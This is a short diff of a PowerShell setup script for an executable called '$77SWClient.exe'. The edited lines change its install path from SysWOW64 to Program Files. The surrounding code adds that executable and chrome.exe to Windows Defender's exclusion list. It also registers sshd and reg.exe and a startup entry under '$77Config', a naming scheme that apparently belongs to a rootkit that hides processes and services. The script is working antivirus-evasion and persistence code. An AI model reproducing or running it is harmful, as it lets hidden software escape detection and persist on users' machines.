@@ -84,7 +84,7 @@ $exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
 # Use the Add-MpPreference cmdlet to add the executable to the exclusion list
 Add-MpPreference -ExclusionPath $exePath
 
-$exePath = 'C:\Windows\SysWOW64\$77Starware\$77SWClient.exe'
+$exePath = 'C:\Program Files\$77Starware\$77SWClient.exe'
 Add-MpPreference -ExclusionPath $exePath
 
 # Adds `chrome.exe' to the Windows Defender exclusion list
@@ -204,7 +204,7 @@ Add-ServiceName -service 'sshd'
 Add-ProcessName -process 'reg.exe'
 
 # Adds startup applications to $77Config
-Add-StartupApplication -applicationPath 'C:\Windows\SysWOW64\$77Starware\$77SWClient.exe'
+Add-StartupApplication -applicationPath 'C:\Program Files\$77Starware\$77SWClient.exe'
 
 # Output completion message
 Write-Host "Services, processes, and startup applications have been configured in the registry."
